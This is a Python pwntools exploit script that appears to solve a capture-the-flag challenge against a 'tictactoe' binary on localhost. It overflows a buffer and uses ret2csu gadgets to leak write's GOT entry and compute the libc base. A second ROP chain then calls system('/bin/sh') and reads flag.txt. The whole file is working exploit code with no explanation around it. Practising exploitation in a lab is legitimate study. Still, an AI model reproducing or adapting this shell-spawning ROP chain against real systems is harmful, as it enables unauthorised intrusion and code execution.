#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./tictactoe')
libc = ELF('./libc.so.6')
rop = ROP(elf)

#io = process('./tictactoe')
io = remote('localhost',1740)

write_got = elf.got["write"]
main = elf.sym["main"]

csu1_bytes = b'[]A\\A]A^A_\xc3'
csu1 = next(elf.search(csu1_bytes, executable=True))
log.info(f'Found ret2csu gadget 1 at {hex(csu1)}')

csu2_bytes = b'L\x89\xf2L\x89\xeeD\x89\xe7A\xff\x14\xdfH\x83\xc3\x01H9\xdd'
csu2 = next(elf.search(csu2_bytes, executable=True))
log.info(f'Found ret2csu gadget 2 at {hex(csu2)}')

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

def csu(rbx, rbp, r12, r13, r14, r15, ret):
    payload = flat(
        b"A" * offset,
        csu1, rbx, rbp, r12, r13, r14, r15,
        csu2,
        b"B" * 56,
        ret,
    )
    return payload

io.sendline(b"1")
io.sendline(b"7")
io.sendline(b"4")

offset = 0x58

payload1 = csu(rbx=0, rbp=1, r12=1, r13=write_got, r14=8, r15=write_got, ret=main)

io.sendline(payload1)

io.recvuntil(b"stone: ")
write_leak = u64(io.recv(8))
libc.address = write_leak - libc.sym['__write']
log.info(f'libc base: {hex(libc.address)}')

bin_sh = next(libc.search(b"/bin/sh\0"))
system = libc.sym.system
ret = rop.find_gadget(['ret'])[0]

payload2 = flat(
    b"A" * offset,
    pop_rdi, bin_sh,
    ret, system,
)

io.sendline(b"5")

io.sendline(payload2)

io.sendline("cat flag.txt")

io.interactive()
